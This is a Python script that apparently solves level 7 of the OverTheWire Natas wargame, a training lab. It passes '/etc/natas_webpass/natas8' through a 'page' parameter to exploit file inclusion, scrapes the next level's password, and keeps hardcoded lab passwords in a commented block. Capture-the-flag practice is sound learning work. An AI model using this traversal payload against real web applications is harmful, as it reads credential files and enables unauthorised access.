from bs4 import BeautifulSoup
import requests
import re

lvl = '7'
next_level = str(int(lvl)+1)
pwd = open(f"./passwords/{'natas'+'0'+lvl if len(lvl)==1 else 'natas'+lvl}.pwd", 'r').read().strip()

url = f'http://natas{lvl}.natas.labs.overthewire.org'
lvl_pass = requests.auth.HTTPBasicAuth(f'natas{lvl}',pwd)

my_params={'page':'/etc/natas_webpass/natas8'}

soup = BeautifulSoup(requests.get(url=url,auth=lvl_pass, params=my_params).text, 'html.parser')

pw=re.search(r"[a-zA-Z0-9]{32}",soup.find("div",id="content").text)[0]
open(f"./passwords/{'natas'+'0'+next_level if len(next_level)==1 else 'natas'+next_level}.pwd", 'w').write(pw)
'''
def make():
    res = requests.get(url=url,auth=lvl_pass,params=my_params)
    soup = BeautifulSoup(res.text, 'html.parser')
    return (res, soup)
def writeResponse(enumerate = ''):
    with open(f'./response{enumerate}.html', 'w') as browserFile:
        browserFile.write(soup.prettify())


lvl_name = 'natas7'
url = f'http://{lvl_name}.natas.labs.overthewire.org'
lvl_pass = requests.auth.HTTPBasicAuth(f'{lvl_name}','jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr')
my_params={'page':'/etc/natas_webpass/natas8'}


res, soup = make()
writeResponse()
print(re.search(r"[a-zA-Z0-9]{32}",soup.find("div",id="content").text)[0])


Learning both about directory traversal and PHP arguments!

Username: natas8
Password: a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB

'''
